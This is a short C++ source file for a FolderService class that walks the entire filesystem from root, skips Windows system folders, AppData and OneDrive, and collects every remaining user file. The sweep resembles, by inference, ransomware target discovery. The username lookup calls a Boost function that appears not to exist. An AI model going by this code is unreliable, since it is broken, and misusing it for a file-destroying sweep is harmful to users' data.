#include "Folderservice.h"

FolderService::FolderService() {
    // Initialisation de l'attribut username
    m_username = boost::system::user_info().username();

    // Initialisation de la liste statique des parties de chemins à écarter
    m_exclude_paths.push_back("\\Windows");
    m_exclude_paths.push_back("\\Program Files");
    m_exclude_paths.push_back("\\Program Files (x86)");
    m_exclude_paths.push_back("\\ProgramData");
    m_exclude_paths.push_back("\\Users\\" + m_username + "\\AppData");
    m_exclude_paths.push_back("\\Users\\" + m_username + "\\OneDrive");
}

std::vector<std::string>& FolderService::list_files() {
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory(it->path());
        }
    }
    return get_data_files();
}

void FolderService::list_files_in_directory(boost::filesystem::path directory) {
    for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
        std::string path = it->path().string();

        // Vérifie si le chemin contient l'une des parties de chemins à écarter
        bool exclude = false;
        for (const std::string& exclude_path : m_exclude_paths) {
            if (path.find(exclude_path) != std::string::npos) {
                exclude = true;
                break;
            }
        }

        if (!exclude) {
            if (boost::filesystem::is_regular_file(it->path())) {
                std::cout << it->path() << std::endl;
                m_data_files.push_back(path);
            } else if (boost::filesystem::is_directory(it->path())) {
                list_files_in_directory(it->path());
            }
        }
    }
}
